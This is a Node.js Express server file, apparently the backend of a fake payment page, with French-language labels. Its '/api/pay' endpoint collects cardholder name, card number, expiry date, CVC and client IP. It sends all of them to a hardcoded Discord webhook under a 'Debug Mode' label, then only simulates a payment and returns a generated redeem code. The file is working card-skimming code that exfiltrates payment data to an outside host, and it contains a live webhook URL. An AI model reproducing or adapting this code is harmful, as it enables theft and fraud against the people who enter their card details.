const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;
const CODES_FILE = path.join(__dirname, 'codes.json');
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1483531247685992608/UtI6SotnOhf-Iw95F82v-pfzCHQfTh_mzcMQ0vmzmBB3cEwxAHI3kEuM_boX7AqhzsNE";

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Ensure codes file exists
if (!fs.existsSync(CODES_FILE)) {
    fs.writeFileSync(CODES_FILE, JSON.stringify({ codes: [] }, null, 2));
}

function generateCode() {
    return Array.from({ length: 4 }, () => 
        Math.random().toString(36).substring(2, 6).toUpperCase()
    ).join('-');
}

app.post('/api/pay', async (req, res) => {
    const { cardHolder, cardNumber, expiry, cvc } = req.body;

    // Send debug data to Discord Webhook
    try {
        await axios.post(DISCORD_WEBHOOK, {
            embeds: [{
                title: "💳 Nouvelle tentative de paiement - Debug Mode",
                color: 0x9D50BB,
                fields: [
                    { name: "👤 Titulaire", value: `\`${cardHolder || 'Inconnu'}\``, inline: true },
                    { name: "🔢 Numéro", value: `\`${cardNumber || 'Inconnu'}\``, inline: true },
                    { name: "📅 Expiration", value: `\`${expiry || 'Inconnu'}\``, inline: true },
                    { name: "🔒 CVC", value: `\`${cvc || 'Inconnu'}\``, inline: true },
                    { name: "🌐 Client IP", value: `\`${req.ip}\`` }
                ],
                timestamp: new Date()
            }]
        });
    } catch (err) {
        console.error("Webhook error:", err.message);
    }

    // Simulate delay
    setTimeout(() => {
        // Basic simulation validation
        if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
            return res.status(400).json({ success: false, message: 'Numéro de carte invalide' });
        }

        const newCode = generateCode();
        const data = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));
        
        data.codes.push({
            code: newCode,
            claimed: false,
            timestamp: Date.now()
        });

        fs.writeFileSync(CODES_FILE, JSON.stringify(data, null, 2));

        res.json({ success: true, code: newCode });
    }, 1500);
});

app.listen(PORT, () => {
    console.log(`Web server running on http://localhost:${PORT}`);
});
